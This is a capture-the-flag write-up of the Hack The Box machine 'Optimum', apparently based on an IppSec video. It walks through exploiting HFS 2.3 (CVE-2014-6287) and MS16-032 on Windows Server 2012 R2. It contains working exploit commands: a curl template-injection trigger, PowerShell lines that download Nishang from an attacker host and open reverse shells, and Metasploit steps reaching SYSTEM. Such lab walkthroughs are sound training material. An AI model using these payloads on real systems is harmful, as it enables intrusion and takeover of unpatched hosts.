# Optimum

| Attribute | Value |
|---|---|
| OS | Windows Server 2012 R2 (standalone) |
| Difficulty | Easy |
| IP | 10.10.10.8 |
| IppSec video | <https://www.youtube.com/watch?v=kWTnVBIpNsE> |

## Source
- `[per transcript]` — IppSec demonstrates the box *twice*: once
  manually with PowerShell (no Metasploit), once via Metasploit
  multi/handler. Quote: *"this was a really cool box if you did about
  three years ago when I originally did it ... no Metasploit module ...
  in 2016 a Metasploit module came around and made this exploit super
  duper easy ... so we'll do this box two different ways"*.
- `[reconstructed]` — exact CVE numbers (CVE-2014-6287 for HFS,
  MS16-032 for kernel) and PowerShell exploit paths.

## TL;DR Attack Chain
Single open port 80 hosts HFS (HttpFileServer) 2.3 by Rejetto, banner
visible in nmap. CVE-2014-6287 is an unauthenticated RCE via
crafted `null-byte + execute` syntax (`{.exec|<cmd>.}`). Trigger it
to download a Nishang reverse-shell from the attacker and run it →
shell as `kostas` (a regular user). On the box, `whoami /priv` shows
no SeImpersonate. Apply MS16-032 (Windows secondary logon handle
elevation; works on unpatched 2012R2/2008R2) — IppSec runs both the
manual `Invoke-MS16-032` PowerShell exploit and the Metasploit
`local_exploit_suggester` → `bypassuac/ms16_032_secondary_logon_handle_privesc` for comparison.

## Initial Enumeration

```bash
sudo nmap -p- --min-rate=10000 -T4 -oA nmap/all-tcp 10.10.10.8
sudo nmap -sV -sC -p 80 -oA nmap/detail 10.10.10.8
```

Single open port:
```
80/tcp open http   HttpFileServer httpd 2.3
```

> **IppSec key reasoning**: "Only port 80; the moment we see HFS 2.3 in
> the banner, that's CVE-2014-6287. We can searchsploit it."

## Attack Surface Mapping

| Service | Port | Hypothesis |
|---|---|---|
| HFS 2.3 | 80 | **Foothold** — known unauth RCE |

That's the entire surface. There is no enumeration "loop" here; the box
is single-purpose.

## Foothold

### 1. Confirm the version

```bash
curl -sI http://10.10.10.8/
# Server: HFS 2.3
```

Or just open it in a browser; HFS by Rejetto displays its branding
prominently.

### 2. Locate the exploit

```bash
searchsploit hfs 2.3
# 39161  Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)
# 49125  Rejetto Http File Server (HFS) 2.3.x - Remote Command Execution (Metasploit)
```

The relevant script is the unauth-RCE one (`39161.py` or similar). Read
it before running:

```bash
searchsploit -m 39161
cat 39161.py
```

The vulnerability: HFS 2.3 has a templating syntax `{.exec|cmd.}` that
fires **without authentication** when included in certain URLs (e.g.,
`/?search=` parameter). Null-byte handling lets attackers inject the
template character.

### 3. Manual exploitation (Path 1)

The exact URL pattern is:
```
http://10.10.10.8/?search=%00{.exec|cmd.exe /c <command>.}
```

Steps:

```bash
# attacker
sudo python3 -m http.server 80
# host Invoke-PowerShellTcp.ps1 (Nishang)
nc -lvnp 4444
```

Trigger:
```bash
curl -G "http://10.10.10.8/" --data-urlencode "search=%00{.exec|cmd.exe /c powershell.exe -nop -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.x/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.x -Port 4444\".}"
```

Caller note: the URL-encoded `%00` is mandatory; without it the template
parser is in the wrong state. The closing `.}` is mandatory too;
forgetting it is the #1 reason this exploit appears to fail silently.

Reverse shell connects as `Optimum\kostas`.

### 4. Confirm the foothold

```powershell
whoami
# optimum\kostas
hostname
# OPTIMUM
```

Read `user.txt` from `C:\Users\kostas\Desktop\user.txt`.

## Privilege Escalation

### 5. Recon

```powershell
systeminfo > systeminfo.txt
# OS: Windows Server 2012 R2 Standard
# patches: handful
whoami /priv
# nothing useful — no SeImpersonate, no SeBackup
```

### 6. Patch analysis

```bash
# from attacker, with the systeminfo dump
wes.py systeminfo.txt
# or:
windows-exploit-suggester.py --database 2017-... --systeminfo systeminfo.txt
```

The output flags MS16-032 (CVE-2016-0099) — a secondary-logon handle
elevation. A PowerShell PoC `Invoke-MS16-032.ps1` exists.

### 7. Manual MS16-032 (Path 1)

```powershell
# from the kostas shell
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.x/Invoke-MS16-032.ps1')
Invoke-MS16-032 -Command 'IEX (New-Object Net.WebClient).DownloadString(''http://10.10.14.x/Invoke-PowerShellTcp.ps1'');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.x -Port 4445'
```

Listener on a different port; new shell connects as
`NT AUTHORITY\SYSTEM`.

### 8. Metasploit version (Path 2)

```bash
# from the same callback as kostas, send shell to MSF instead:
sudo msfconsole -q
> use exploit/multi/handler
> set payload windows/x64/meterpreter/reverse_tcp
> set lhost tun0
> set lport 4444
> run
# (re-fire the HFS exploit pointing at MSF handler)

# once you have meterpreter as kostas:
> background
> use post/multi/recon/local_exploit_suggester
> set session 1
> run

# MSF flags:
# exploit/windows/local/ms16_032_secondary_logon_handle_privesc

> use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
> set session 1
> set payload windows/x64/meterpreter/reverse_tcp
> set lhost tun0
> set lport 4445
> run
# SYSTEM session
```

Read `C:\Users\Administrator\Desktop\root.txt`.

## Key Findings

- HFS 2.3 banner = instant CVE-2014-6287 path. Exact-version banners
  are the cheapest possible foothold signal.
- The exploit's null-byte (`%00`) and template closing (`.}`) are easy to
  forget — read the exploit before firing.
- `windows-exploit-suggester` / `wes.py` against `systeminfo.txt`
  rapidly identifies kernel privesc candidates on older Windows.
- IppSec's "two paths" framing — *manual then Metasploit* — is the
  pedagogical pattern: master the primitive, then automate it.

## Tools Used

| Tool | Purpose |
|---|---|
| `nmap` | Service discovery |
| `searchsploit` | Locate the public exploit |
| `curl` | Fire the manual HFS RCE |
| `Invoke-PowerShellTcp.ps1` (Nishang) | Reverse shell |
| `Invoke-MS16-032.ps1` (FuzzySecurity) | Manual privesc |
| `wes.py` / `windows-exploit-suggester` | Patch-level analysis |
| `msfconsole` (multi/handler, local_exploit_suggester, ms16_032 module) | Automated path |

## Decision Tree

```
nmap → only port 80, HFS 2.3
  └─ searchsploit → CVE-2014-6287
       └─ curl '?search=%00{.exec|...}.' → reverse shell as kostas
            └─ systeminfo + whoami /priv
                 ├─ Path A (manual):
                 │    Invoke-MS16-032 → SYSTEM
                 └─ Path B (msf):
                      meterpreter session → local_exploit_suggester
                           → ms16_032 module → SYSTEM
                                └─ root.txt
```

## Alternative Approaches

- Use the metasploit module `exploit/windows/http/rejetto_hfs_exec`
  for the foothold; works in one step.
- Use `MS16-032.exe` (compiled C) instead of PowerShell — useful when
  PowerShell is blocked or constrained-language mode is enforced.
- Use `JuicyPotato` — does **not** apply here; this user has no
  SeImpersonate (Optimum is *not* a service account; that's why kernel
  privesc is the path).
- Use `BeRoot` or `PowerUp.ps1` to enumerate other privesc paths if
  MS16-032 is patched.

## Lessons Learned

1. Banner-driven CVEs are the lowest-friction foothold class; recognise
   the names: HFS, ColdFusion, Drupal 7.5, Joomla, Tomcat, JBoss,
   ManageEngine, Solr, Confluence, etc.
2. Reading exploits before running them prevents 80% of "exploit
   silently fails" loops.
3. Two-path teaching is highly transferable: practise the manual first,
   *then* memorise the Metasploit option.
4. `windows-exploit-suggester` against `systeminfo.txt` is the
   30-second answer to "what kernel exploits apply".
5. Service vs. user account distinction matters: low-priv user without
   SeImpersonate ⇒ kernel/exploit path; service user with
   SeImpersonate ⇒ Potato path.

## Extracted Skills

- [`common-exploits/hfs-cve-2014-6287.md`](../common-exploits/hfs-cve-2014-6287.md)
- [`windows-privesc/kernel-exploits.md`](../windows-privesc/kernel-exploits.md)
- [`windows-privesc/ms16-032.md`](../windows-privesc/ms16-032.md)
- [`reverse-shells/powershell-reverse-shell.md`](../reverse-shells/powershell-reverse-shell.md)
- [`tool-usage/searchsploit.md`](../tool-usage/searchsploit.md)
- [`tool-usage/metasploit.md`](../tool-usage/metasploit.md)

## Related Techniques (other machines)

- **Granny / Grandpa** — IIS WebDAV foothold + kernel privesc on older
  Windows.
- **Devel** — ASPX upload via FTP-anon + kernel privesc.
- **Nibbles** — webshell upload + kernel privesc.
- **Bashed** (Linux equivalent) — web RCE → user → kernel-equivalent
  (cron) privesc.
- **Legacy** — different Windows non-AD, very-old foothold.
